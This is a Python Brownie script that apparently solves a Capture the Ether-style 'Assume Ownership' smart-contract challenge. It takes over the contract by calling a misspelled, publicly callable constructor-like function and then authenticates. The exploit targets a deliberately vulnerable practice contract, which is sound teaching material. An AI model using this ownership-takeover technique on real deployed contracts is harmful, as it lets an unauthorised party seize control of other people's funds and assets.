from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    AssumeOwnershipChallenge,
)
from scripts.helpful_scripts import (
    get_account,
    get_challenge_contract,
    check_solution,
)
from web3 import Web3


def main():
    player = get_account("player")
    non_player = get_account("non_player")
    challenge_contract = get_challenge_contract(AssumeOwnershipChallenge, "assume_ownership", [], {"from": non_player})

    tx = challenge_contract.AssumeOwmershipChallenge({"from": player})
    tx.wait(1)
    tx = challenge_contract.authenticate({"from": player})
    tx.wait(1)

    check_solution(challenge_contract)